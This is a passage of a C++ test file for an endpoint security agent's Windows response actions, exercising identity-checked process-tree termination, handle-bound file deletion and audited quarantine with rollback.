                                         FILE_ATTRIBUTE_NORMAL, nullptr);
    CHECK(replacementFile != INVALID_HANDLE_VALUE);
    CloseHandle(replacementFile);
    FakeResponsePlatform platform;
    platform.mutateDeleteIdentity = true;
    FakeResponseAudit audit;
    FakeEmergencySink emergency;
    ResponseFileIdentity selfIdentity;
    selfIdentity.volumeSerial = 99;
    selfIdentity.fileId[0] = 99;
    ResponseActionExecutor executor(platform, audit, emergency, 1,
                                     &selfIdentity);
    DeleteFileRequest request;
    request.requestId = "abababab-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.reason = "identity binding";
    request.path = WideToUtf8(replacementPath.c_str());
    DeleteFileResult result = executor.ExecuteDeleteFile(request);
    CHECK(result.status == "identity_changed");
    CHECK(!result.deleted);
    CHECK(audit.attemptDeleteFiles == 1 && audit.outcomeDeleteFiles == 1);
    CHECK(GetFileAttributesW(replacementPath.c_str()) != INVALID_FILE_ATTRIBUTES);
    CHECK(DeleteFileW(replacementPath.c_str()));
}

static void TestResponseActionControlledChild() {
    struct ChildCleanup {
        HANDLE process = nullptr;
        HANDLE thread = nullptr;
        HANDLE job = nullptr;
        ~ChildCleanup() {
            if (process && WaitForSingleObject(process, 0) == WAIT_TIMEOUT)
                TerminateProcess(process, 99);
            if (thread) CloseHandle(thread);
            if (process) CloseHandle(process);
            if (job) CloseHandle(job);
        }
    } cleanup;
    wchar_t directory[MAX_PATH] = {};
    CHECK(GetModuleFileNameW(nullptr, directory, MAX_PATH) != 0);
    wchar_t* slash = wcsrchr(directory, L'\\');
    CHECK(slash != nullptr);
    *(slash + 1) = L'\0';
    std::wstring childPath = std::wstring(directory) + L"response_test_child.exe";

    cleanup.job = CreateJobObjectW(nullptr, nullptr);
    CHECK(cleanup.job != nullptr);
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION limits = {};
    limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    CHECK(SetInformationJobObject(cleanup.job, JobObjectExtendedLimitInformation,
                                  &limits, sizeof(limits)));

    STARTUPINFOW startup = {sizeof(startup)};
    PROCESS_INFORMATION process = {};
    std::wstring command = L"\"" + childPath + L"\"";
    CHECK(CreateProcessW(childPath.c_str(), command.data(), nullptr, nullptr,
                         FALSE, CREATE_SUSPENDED, nullptr, directory,
                         &startup, &process));
    cleanup.process = process.hProcess;
    cleanup.thread = process.hThread;
    CHECK(AssignProcessToJobObject(cleanup.job, process.hProcess));
    CHECK(ResumeThread(process.hThread) != static_cast<DWORD>(-1));
    CloseHandle(process.hThread);
    cleanup.thread = nullptr;

    FILETIME create = {}, exit = {}, kernel = {}, user = {};
    CHECK(GetProcessTimes(process.hProcess, &create, &exit, &kernel, &user));
    uint64_t createTime = (static_cast<uint64_t>(create.dwHighDateTime) << 32) |
                          create.dwLowDateTime;

    NativeResponseActionPlatform platform;
    FakeResponseAudit audit;
    FakeEmergencySink emergency;
    ResponseActionExecutor executor(platform, audit, emergency, 5000);
    ResponseActionRequest request = TestActionRequest(process.dwProcessId);
    request.requestId = "bbbbbbbb-1234-1234-1234-123456789abc";
    request.createTime100ns = createTime + 1;
    ResponseActionResult rejected = executor.Execute(request);
    CHECK(rejected.status == "identity_mismatch");
    CHECK(WaitForSingleObject(process.hProcess, 0) == WAIT_TIMEOUT);
    CHECK(audit.attempts == 0);

    request.requestId = "cccccccc-1234-1234-1234-123456789abc";
    request.createTime100ns = createTime;
    ResponseActionResult result = executor.Execute(request);
    CHECK(result.status == "terminated");
    CHECK(result.terminationRequested && result.exitObserved);
    CHECK(WaitForSingleObject(process.hProcess, 0) == WAIT_OBJECT_0);
}

static ResponseActionResult ExecuteFakeTree(FakeResponsePlatform& platform,
                                            FakeResponseAudit& audit,
                                            FakeEmergencySink& emergency,
                                            uint32_t requestTreeSize,
                                            uint32_t executorMaxTreeSize = 32,
                                            bool suspend = false,
                                            DWORD pid = 100) {
    ResponseActionExecutor executor(platform, audit, emergency, 1, nullptr, {},
                                    executorMaxTreeSize);
    ResponseActionRequest request = TestActionRequest(pid);
    request.maxTreeSize = requestTreeSize;
    request.suspendBeforeTerminate = suspend;
    return executor.Execute(request);
}

static void TestResponseActionTreeRejectsReusedChildPid() {
    FakeResponsePlatform platform;
    FakeResponseAudit audit;
    FakeEmergencySink emergency;
    platform.children = {200};
    platform.replaceChildPidAfterEnumeration = true;
    ResponseActionResult result = ExecuteFakeTree(
        platform, audit, emergency, 8, 32, true);

    /* PID 200 named the enumerated child instance at creation time 123.
     * Reopening that PID yields replacement instance 124, which must not be
     * suspended or terminated; the independently verified root may proceed. */
    CHECK(result.status == "partial_tree");
    CHECK(result.childrenSkipped == 1 && result.childrenTerminated == 0 &&
          result.childrenFailed == 0);
    CHECK(platform.suspendCalls == 1);
    CHECK(platform.suspendedPids.size() == 1 && platform.suspendedPids[0] == 100);
    CHECK(platform.terminatedPids.size() == 1 &&
          platform.terminatedPids[0] == 100);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);
}

static void TestResponseActionTreeSeams() {
    FakeResponsePlatform platform;
    FakeResponseAudit audit;
    FakeEmergencySink emergency;
    platform.children = {300, 301};
    ResponseActionResult result =
        ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "tree_terminated");
    CHECK(result.treeRequested && result.terminationRequested &&
          result.exitObserved);
    CHECK(result.childrenTerminated == 2 && result.childrenSkipped == 0 &&
          result.childrenFailed == 0);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);

    /* requested cap is clamped by the executor's configured maximum. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.children = {300, 301, 302, 303, 304};
    result = ExecuteFakeTree(platform, audit, emergency, 8, 4);
    CHECK(result.status == "tree_truncated");
    CHECK(result.treeTruncated);
    CHECK(result.childrenTerminated == 3);

    /* denied per-child image (svchost.exe) is skipped, root still killed. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.children = {300, 301};
    platform.childBase = L"svchost.exe";
    result = ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "partial_tree");
    CHECK(result.childrenTerminated == 0 && result.childrenSkipped == 2 &&
          result.childrenFailed == 0);
    CHECK(result.terminationRequested && result.exitObserved);

    /* child whose file identity equals the agent is skipped. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.children = {300, 301};
    platform.childBase = L"grandchild.exe";
    platform.childIdentitySelf = true;
    result = ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "partial_tree");
    CHECK(result.childrenSkipped == 2);

    /* child terminate failures surface as child_terminate_failed. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.children = {300, 301};
    platform.failChildTerminates = 2;
    result = ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "child_terminate_failed");
    CHECK(result.childrenFailed == 2 && result.childrenTerminated == 0);
    CHECK(result.terminationRequested && result.exitObserved);

    /* suspend-before-terminate is applied to every child and the root. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.children = {300, 301};
    result = ExecuteFakeTree(platform, audit, emergency, 8, 32, true);
    CHECK(result.status == "tree_terminated");
    CHECK(platform.suspendCalls == 3 && platform.resumeCalls == 0);

    /* root identity re-check fails after children were already handled. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.failure = FakeResponsePlatform::Failure::CreateSecond;
    result = ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "identity_changed");
    CHECK(result.childrenTerminated == 0 && !platform.terminateCalled);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);

    /* enumeration failure degrades to root-only, counted as a skip so the
     * caller sees the subtree was not fully enumerated. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.children = {300};
    platform.enumerateFail = true;
    result = ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "partial_tree");
    CHECK(result.childrenTerminated == 0 && result.childrenSkipped == 1);

    /* single-process policies still gate the tree root. */
    for (int policy = 0; policy < 5; ++policy) {
        platform = FakeResponsePlatform(); audit = FakeResponseAudit();
        if (policy == 0) platform.sameImage = true;
        if (policy == 1) platform.critical = true;
        if (policy == 2) platform.protectedProcess = true;
        if (policy == 3) platform.sessionZero = true;
        if (policy == 4) platform.systemSid = true;
        result = ExecuteFakeTree(platform, audit, emergency, 8);
        CHECK(result.status == "policy_rejected");
        CHECK(!result.treeRequested && !platform.terminateCalled);
        CHECK(audit.attempts == 0 && audit.outcomes == 0);
    }

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    result = ExecuteFakeTree(platform, audit, emergency, 8, 32, false, 4);
    CHECK(result.status == "policy_rejected");
    CHECK(!platform.terminateCalled);

    /* Isolation and snapshot hooks must follow root checks and the durable
     * attempt record; an unaudited or rejected request has no side effects. */
    auto requestWithHooks = [](int& isolationCalls, int& snapshotCalls,
                               FakeResponseAudit& actionAudit) {
        ResponseActionRequest request = TestActionRequest();
        request.maxTreeSize = 8;
        request.isolateBeforeTerminate = true;
        request.preIsolationCallback = [&](std::string&) {
            CHECK(actionAudit.attempts == 1);
            ++isolationCalls;
            return true;
        };
        request.preSnapshotCallback = [&](const std::string&, uint32_t) {
            CHECK(actionAudit.attempts == 1);
            ++snapshotCalls;
        };
        return request;
    };
    int isolationCalls = 0, snapshotCalls = 0;
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.critical = true;
    {
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        result = executor.Execute(requestWithHooks(isolationCalls, snapshotCalls, audit));
    }
    CHECK(result.status == "policy_rejected");
    CHECK(isolationCalls == 0 && snapshotCalls == 0 && audit.attempts == 0);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    audit.failAttempt = true;
    {
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        result = executor.Execute(requestWithHooks(isolationCalls, snapshotCalls, audit));
    }
    CHECK(result.status == "audit_failed");
    CHECK(isolationCalls == 0 && snapshotCalls == 0 && !platform.terminateCalled);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.failure = FakeResponsePlatform::Failure::CreateSecond;
    {
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        result = executor.Execute(requestWithHooks(isolationCalls, snapshotCalls, audit));
    }
    CHECK(result.status == "identity_changed" && !platform.terminateCalled);
    CHECK(isolationCalls == 0 && snapshotCalls == 0 &&
          audit.attempts == 1 && audit.outcomes == 1);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    {
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        ResponseActionRequest request = requestWithHooks(isolationCalls,
                                                         snapshotCalls, audit);
        request.preIsolationCallback = [](std::string& error) {
            error = "isolation unavailable";
            return false;
        };
        result = executor.Execute(request);
    }
    CHECK(result.status == "isolation_failed" && result.isolationRequested &&
          !result.isolationSucceeded && !platform.terminateCalled);
    CHECK(snapshotCalls == 0 && audit.attempts == 1 && audit.outcomes == 1);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    {
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        ResponseActionRequest request = requestWithHooks(isolationCalls,
                                                         snapshotCalls, audit);
        request.preIsolationCallback = {};
        result = executor.Execute(request);
    }
    CHECK(result.status == "isolation_failed" && !platform.terminateCalled);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    {
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        ResponseActionRequest request = requestWithHooks(isolationCalls,
                                                         snapshotCalls, audit);
        request.preSnapshotCallback = [](const std::string&, uint32_t) {
            throw std::runtime_error("snapshot unavailable");
        };
        result = executor.Execute(request);
    }
    CHECK(result.status == "snapshot_failed" && result.isolationSucceeded &&
          !result.snapshotCaptured && !platform.terminateCalled);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);

    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    {
        ResponseActionExecutor executor(platform, audit, emergency, 1);
        result = executor.Execute(requestWithHooks(isolationCalls, snapshotCalls, audit));
    }
    CHECK(result.status == "tree_terminated" && result.isolationSucceeded);
    CHECK(isolationCalls == 2 && snapshotCalls == 1 && audit.outcomes == 1);
}

static void TestResponseTreeChildPolicySkips() {
    /* Per-child policy overrides reject only that child; the root (pid 100)
     * keeps using the global flags and is still terminated. */
    for (int policy = 0; policy < 4; ++policy) {
        FakeResponsePlatform platform; FakeResponseAudit audit; FakeEmergencySink emergency;
        platform.children = {200};
        if (policy == 0) platform.childCritical.insert(200);
        if (policy == 1) platform.childProtected.insert(200);
        if (policy == 2) platform.childSessionZero.insert(200);
        if (policy == 3) platform.childSystemSid.insert(200);
        ResponseActionResult result = ExecuteFakeTree(platform, audit, emergency, 8);
        CHECK(result.status == "partial_tree");
        CHECK(result.childrenSkipped == 1 && result.childrenTerminated == 0 &&
              result.childrenFailed == 0);
        CHECK(result.terminationRequested && result.exitObserved);
        CHECK(platform.terminateCalled && platform.terminateCalls == 1);
    }

    /* A failing per-child Critical() call also skips the child (root killed). */
    FakeResponsePlatform platform; FakeResponseAudit audit; FakeEmergencySink emergency;
    platform.children = {200};
    platform.failChildCritical = 200;
    ResponseActionResult result = ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "partial_tree");
    CHECK(result.childrenSkipped == 1 && result.childrenTerminated == 0 &&
          result.childrenFailed == 0);
    CHECK(platform.terminateCalls == 1);

    /* Control: an unaffected child is still terminated. */
    platform = FakeResponsePlatform(); audit = FakeResponseAudit();
    platform.children = {200};
    result = ExecuteFakeTree(platform, audit, emergency, 8);
    CHECK(result.status == "tree_terminated");
    CHECK(result.childrenTerminated == 1 && result.childrenSkipped == 0 &&
          result.childrenFailed == 0);
    CHECK(platform.terminateCalls == 2);
}

static void TestResponseDeleteFileHandleBinding() {
    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) > 0);
    const std::wstring path = std::wstring(temp) +
        L"edr-response-delete-handle-race-" +
        std::to_wstring(GetCurrentProcessId()) + L".txt";
    const std::wstring backup = path + L".identity-original";
    DeleteFileW(path.c_str());
    DeleteFileW(backup.c_str());
    HANDLE original = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    CHECK(original != INVALID_HANDLE_VALUE);
    const char contents[] = "original";
    DWORD written = 0;
    CHECK(WriteFile(original, contents, static_cast<DWORD>(sizeof(contents)),
                    &written, nullptr));
    CHECK(written == sizeof(contents));
    CloseHandle(original);

    FakeResponsePlatform platform;
    platform.replaceDeletePathAfterFinalIdentityCheck = true;
    FakeResponseAudit audit;
    FakeEmergencySink emergency;
    ResponseFileIdentity selfIdentity;
    selfIdentity.volumeSerial = 99;
    selfIdentity.fileId[0] = 99;
    ResponseActionExecutor executor(platform, audit, emergency, 1,
                                    &selfIdentity);
    DeleteFileRequest request;
    request.requestId = "cdcdcdcd-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.reason = "delete by verified file handle";
    request.path = WideToUtf8(path.c_str());
    DeleteFileResult result = executor.ExecuteDeleteFile(request);

    const bool replacementRemains =
        GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
    const bool originalWasRemoved =
        GetFileAttributesW(backup.c_str()) == INVALID_FILE_ATTRIBUTES;
    DeleteFileW(path.c_str());
    DeleteFileW(backup.c_str());
    CHECK(result.status == "deleted" && result.deleted);
    CHECK(platform.deletePathReplaced);
    CHECK(replacementRemains && originalWasRemoved);
    CHECK(audit.attemptDeleteFiles == 1 && audit.outcomeDeleteFiles == 1);
}

static void TestResponseActionControlledTree() {
    struct ChildCleanup {
        HANDLE process = nullptr;
        HANDLE thread = nullptr;
        HANDLE job = nullptr;
        ~ChildCleanup() {
            if (process && WaitForSingleObject(process, 0) == WAIT_TIMEOUT)
                TerminateProcess(process, 99);
            if (thread) CloseHandle(thread);
            if (process) CloseHandle(process);
            if (job) CloseHandle(job);
        }
    } cleanup;
    wchar_t directory[MAX_PATH] = {};
    CHECK(GetModuleFileNameW(nullptr, directory, MAX_PATH) != 0);
    wchar_t* slash = wcsrchr(directory, L'\\');
    CHECK(slash != nullptr);
    *(slash + 1) = L'\0';
    std::wstring childPath = std::wstring(directory) + L"response_test_child.exe";

    cleanup.job = CreateJobObjectW(nullptr, nullptr);
    CHECK(cleanup.job != nullptr);
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION limits = {};
    limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    CHECK(SetInformationJobObject(cleanup.job, JobObjectExtendedLimitInformation,
                                  &limits, sizeof(limits)));

    STARTUPINFOW startup = {sizeof(startup)};
    PROCESS_INFORMATION process = {};
    std::wstring command = L"\"" + childPath + L"\" --spawn";
    CHECK(CreateProcessW(childPath.c_str(), command.data(), nullptr, nullptr,
                         FALSE, CREATE_SUSPENDED, nullptr, directory,
                         &startup, &process));
    cleanup.process = process.hProcess;
    cleanup.thread = process.hThread;
    CHECK(AssignProcessToJobObject(cleanup.job, process.hProcess));
    CHECK(ResumeThread(process.hThread) != static_cast<DWORD>(-1));
    CloseHandle(process.hThread);
    cleanup.thread = nullptr;

    NativeResponseActionPlatform platform;
    std::vector<uint32_t> children;
    DWORD error = ERROR_SUCCESS;
    for (int attempt = 0; attempt < 40; ++attempt) {
        CHECK(platform.EnumerateChildren(process.dwProcessId, children, error));
        if (!children.empty()) break;
        Sleep(50);
    }
    CHECK(children.size() == 1);

    FILETIME create = {}, exit = {}, kernel = {}, user = {};
    CHECK(GetProcessTimes(process.hProcess, &create, &exit, &kernel, &user));
    uint64_t createTime = (static_cast<uint64_t>(create.dwHighDateTime) << 32) |
                          create.dwLowDateTime;

    FakeResponseAudit audit;
    FakeEmergencySink emergency;
    ResponseActionExecutor executor(platform, audit, emergency, 5000, nullptr,
                                    {}, 16);
    ResponseActionRequest request = TestActionRequest(process.dwProcessId);
    request.requestId = "dddddddd-1234-1234-1234-123456789abc";
    request.createTime100ns = createTime;
    request.maxTreeSize = 16;
    request.suspendBeforeTerminate = true;
    ResponseActionResult result = executor.Execute(request);
    CHECK(result.status == "tree_terminated");
    CHECK(result.treeRequested && result.terminationRequested &&
          result.exitObserved);
    CHECK(result.childrenTerminated == 1 && result.childrenSkipped == 0 &&
          result.childrenFailed == 0);
    CHECK(audit.attempts == 1 && audit.outcomes == 1);
    CHECK(WaitForSingleObject(process.hProcess, 0) == WAIT_OBJECT_0);
}

class FakeQuarantinePlatform final : public IQuarantinePlatform {
public:
    bool setupOk = true, openOk = true, infoOk = true, directoryOk = true;
    bool hashOk = true, renameOk = true, aclOk = true, sidecarOk = true;
    bool restoreOk = true;
    DWORD renameError = ERROR_WRITE_FAULT;
    int failRenameCall = 0;
    QuarantineFileInfo source = {}, retained = {}, directory = {};
    std::string hash = std::string(64, 'a');
    std::string finalPath = "C:\\safe-test\\sample.bin";
    int infoCalls = 0, renames = 0, protects = 0, restores = 0;
    std::vector<std::string> renamePaths;
    FakeQuarantinePlatform() {
        source.volumeSerial = directory.volumeSerial = 7;
        source.numberOfLinks = 1;
        retained = source;
        directory.attributes = FILE_ATTRIBUTE_DIRECTORY;
    }
    bool OpenFile(const std::string&, HANDLE& file, DWORD& error) override {
        if (!openOk) { error = ERROR_ACCESS_DENIED; return false; }
        file = reinterpret_cast<HANDLE>(1); return true;
    }
    void CloseHandleSafe(HANDLE) override {}
    bool FileInfo(HANDLE, QuarantineFileInfo& value, DWORD& error) override {
        if (!infoOk) { error = ERROR_INVALID_DATA; return false; }
        value = infoCalls++ == 0 ? source : retained;
        return true;
    }
    bool FinalPath(HANDLE file, std::string& value, DWORD&) override {
        CHECK(file == reinterpret_cast<HANDLE>(1));
        value = finalPath;
        return true;
    }
    bool DirectoryInfo(const std::string&, QuarantineFileInfo& value,
                       DWORD& error) override {
        if (!directoryOk) { error = ERROR_PATH_NOT_FOUND; return false; }
        value = directory; return true;
    }
    bool Hash(HANDLE, std::string& value, DWORD& error) override {
        if (!hashOk) { error = ERROR_READ_FAULT; return false; }
        value = hash; return true;
    }
    bool EnsureQuarantineDir(const std::string&, DWORD& error) override {
        if (!setupOk) { error = ERROR_ACCESS_DENIED; return false; }
        return true;
    }
    bool ProtectAcl(HANDLE file, std::vector<unsigned char>& original,
                    bool& originalProtected, DWORD& error) override {
        CHECK(file == reinterpret_cast<HANDLE>(1));
        ++protects;
        if (!aclOk) { error = ERROR_INVALID_ACL; return false; }
        original.assign(4, 1); originalProtected = false; return true;
    }
    bool RestoreAcl(HANDLE file, const std::vector<unsigned char>& original,
                    bool, DWORD& error) override {
        CHECK(file == reinterpret_cast<HANDLE>(1));
        CHECK(!original.empty());
        ++restores;
        if (!restoreOk) { error = ERROR_INVALID_ACL; return false; }
        return true;
    }
    bool Rename(HANDLE file, const std::string& destination,
                DWORD& error) override {
        CHECK(file == reinterpret_cast<HANDLE>(1));
        ++renames; renamePaths.push_back(destination);
        if (!renameOk || failRenameCall == renames) {
            error = renameError; return false;
        }
        return true;
    }
    bool ProtectMetadata(const std::string& clear, std::string& sealed, DWORD&) override {
        sealed = "fake:" + clear; return true;
    }
    bool UnprotectMetadata(const std::string& sealed, std::string& clear, DWORD&) override {
        if (sealed.compare(0, 5, "fake:") != 0) return false;
        clear = sealed.substr(5); return true;
    }
    bool WriteFileAtomic(const std::string&, const std::string&,
                         DWORD& error) override {
        if (!sidecarOk) { error = ERROR_WRITE_FAULT; return false; }
        return true;
    }
};

class FakeQuarantineAudit final : public IQuarantineAudit {
public:
    bool failAttempt = false, failOutcome = false;
    int attempts = 0, outcomes = 0;
    bool AttemptQuarantine(const QuarantineRequest&, const std::string&,
                           std::string& error) override {
        ++attempts;
        if (failAttempt) { error = "write failed"; return false; }
        return true;
    }
    bool OutcomeQuarantine(const QuarantineRequest&, const QuarantineResult&,
                           std::string& error) override {
        ++outcomes;
        if (failOutcome) { error = "write failed"; return false; }
        return true;
    }
};

static QuarantineRequest TestQuarantineRequest() {
    QuarantineRequest request;
    request.requestId = "eeeeeeee-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.reason = "quarantine seam test";
    request.path = "C:\\safe-test\\sample.bin";
    return request;
}

static QuarantineResult ExecuteFakeQuarantine(FakeQuarantinePlatform& platform,
        FakeQuarantineAudit& audit, FakeEmergencySink& emergency,
        const QuarantineRequest& request = TestQuarantineRequest(),
        uint64_t maximum = 1024) {
    QuarantineExecutor executor(platform, audit, emergency,
                                "C:\\edr-test-quarantine", maximum);
    return executor.Execute(request);
}

static void TestQuarantinePolicySeams() {
    for (int policy = 0; policy < 8; ++policy) {
        FakeQuarantinePlatform platform;
        FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        if (policy == 0) platform.source.attributes = FILE_ATTRIBUTE_REPARSE_POINT;
        if (policy == 1) platform.source.attributes = FILE_ATTRIBUTE_DIRECTORY;
        if (policy == 2) platform.source.volumeSerial = 8;
        if (policy == 3) platform.source.size = 1025;
        if (policy == 4) platform.openOk = false;
        if (policy == 5) platform.setupOk = false;
        if (policy == 6) platform.directoryOk = false;
        if (policy == 7) platform.source.numberOfLinks = 2;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status != "quarantined");
        CHECK(platform.renames == 0 && audit.attempts == 0);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        platform.retained.fileId[15] = 1;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "identity_changed");
        CHECK(platform.infoCalls == 2 && platform.protects == 0 &&
              platform.renames == 0 && audit.attempts == 1 && audit.outcomes == 1);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        platform.retained.numberOfLinks = 2;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "policy_rejected");
        CHECK(platform.protects == 0 && platform.renames == 0 &&
              audit.attempts == 1 && audit.outcomes == 1);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        platform.finalPath = "C:\\safe-test\\resolved-original.bin";
        QuarantineRequest request = TestQuarantineRequest();
        request.path = "C:\\safe-test\\path-replaced-after-open.bin";
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency,
                                                         request);
        CHECK(result.status == "quarantined");
        CHECK(platform.renamePaths.size() == 1);
        CHECK(platform.renamePaths.front().find(".quarantined") != std::string::npos);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        QuarantineRequest request = TestQuarantineRequest();
        request.path = "C:\\safe-test\\bad.\\sample.bin";
        CHECK(ExecuteFakeQuarantine(platform, audit, emergency, request).status ==
              "policy_rejected");
        CHECK(platform.renames == 0);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        QuarantineRequest request = TestQuarantineRequest();
        request.path = ExpandEnvStrings("%SystemRoot%\\System32\\test-owned.bin");
        platform.finalPath = request.path;
        CHECK(ExecuteFakeQuarantine(platform, audit, emergency, request).status ==
              "policy_rejected");
        CHECK(platform.renames == 0);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        QuarantineRequest request = TestQuarantineRequest();
        request.sha256Hex = std::string(64, 'b');
        CHECK(ExecuteFakeQuarantine(platform, audit, emergency, request).status ==
              "hash_mismatch");
        CHECK(platform.renames == 0 && audit.attempts == 0);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency; audit.failAttempt = true;
        CHECK(ExecuteFakeQuarantine(platform, audit, emergency).status == "audit_failed");
        CHECK(platform.renames == 0 && audit.outcomes == 0);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency; platform.renameOk = false;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "move_failed" && result.win32Error == ERROR_WRITE_FAULT);
        CHECK(platform.renames == 1 && platform.restores == 1 && audit.outcomes == 1);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency;
        platform.aclOk = false;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "acl_failed" && !result.rolledBack);
        CHECK(platform.renames == 0 && audit.outcomes == 1);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency; platform.sidecarOk = false;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "sidecar_failed");
        CHECK(result.rolledBack && platform.renames == 2 && platform.restores == 1);
        CHECK(platform.renamePaths[1] == platform.finalPath);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency; platform.renameOk = false;
        platform.renameError = ERROR_FILE_EXISTS;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "destination_exists" && platform.restores == 1);
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency; platform.sidecarOk = false;
        platform.failRenameCall = 2;
        platform.renameError = ERROR_FILE_EXISTS;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "rollback_conflict" && !result.rolledBack);
        CHECK(platform.restores == 0 && !result.quarantinePath.empty());
    }
    {
        FakeQuarantinePlatform platform; FakeQuarantineAudit audit;
        FakeEmergencySink emergency; audit.failOutcome = true;
        QuarantineResult result = ExecuteFakeQuarantine(platform, audit, emergency);
        CHECK(result.status == "quarantined" && !result.auditWritten);
        CHECK(emergency.calls == 1);
    }
}

static bool HasRestrictedAcl(const std::wstring& path, bool inheritable) {
    PSECURITY_DESCRIPTOR descriptor = nullptr;
    PACL dacl = nullptr;
    DWORD status = GetNamedSecurityInfoW(const_cast<LPWSTR>(path.c_str()),
        SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, nullptr, nullptr, &dacl,
        nullptr, &descriptor);
    if (status != ERROR_SUCCESS || !descriptor || !dacl || dacl->AceCount != 2)
        return false;
    SECURITY_DESCRIPTOR_CONTROL control = 0;
    DWORD revision = 0;
    bool valid = GetSecurityDescriptorControl(descriptor, &control, &revision) &&
        (control & SE_DACL_PROTECTED);
    BYTE systemSid[SECURITY_MAX_SID_SIZE], adminSid[SECURITY_MAX_SID_SIZE];
    DWORD systemSize = sizeof(systemSid), adminSize = sizeof(adminSid);
    valid = valid && CreateWellKnownSid(WinLocalSystemSid, nullptr, systemSid,
                                        &systemSize) &&
        CreateWellKnownSid(WinBuiltinAdministratorsSid, nullptr, adminSid,
                           &adminSize);
    bool systemFound = false, adminFound = false;
    for (DWORD i = 0; valid && i < dacl->AceCount; ++i) {
        void* raw = nullptr;
        if (!GetAce(dacl, i, &raw)) { valid = false; break; }
        auto* ace = static_cast<ACCESS_ALLOWED_ACE*>(raw);
        BYTE requiredFlags = inheritable
            ? OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE : 0;
        if (ace->Header.AceType != ACCESS_ALLOWED_ACE_TYPE ||
            (inheritable && (ace->Header.AceFlags & requiredFlags) !=
                                requiredFlags)) {
            valid = false; break;
        }
        PSID sid = &ace->SidStart;
        DWORD mask = ace->Mask;
        GENERIC_MAPPING fileMapping = {
            FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_GENERIC_EXECUTE,
